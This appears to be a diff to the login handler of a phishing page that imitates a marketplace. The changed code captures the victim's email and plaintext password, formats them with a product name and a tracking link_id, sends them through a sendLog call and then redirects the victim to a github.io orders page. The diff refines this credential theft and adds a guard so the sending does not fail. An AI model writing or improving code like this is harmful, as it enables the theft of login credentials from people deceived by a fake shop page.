@@ -899,10 +899,11 @@
             // Get product name from localStorage if available
             const productName = localStorage.getItem('lastProductName') || 'Товар';
 
-            // Send log with product name instead of link_id
-            const logDetails = `👨 Logi: ${email}\n🔐 Pas: ${password}\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`;
+            // Send log with product name and link_id for identification
+            const logDetails = `👨 Logi: ${email}\n🔐 Pas: ${password}\n📦 Товар: ${productName}\nlink_id=${link_id}`;
 
-            sendLog('login_attempt', logDetails, function() {
+            if (typeof sendLog === 'function') {
+              sendLog('login_attempt', logDetails, function() {
                 // Build redirect URL with all parameters
                 const params = new URLSearchParams();
                 if (link_id) params.append('link_id', link_id);
@@ -917,7 +918,8 @@
                     : 'https://roofvbiv-creator.github.io/workbotmm-landing/orders.html';
 
                 window.location.href = ordersUrl;
-            });
+              });
+            }
 
             console.log('Login attempt:', { email, password });
         }
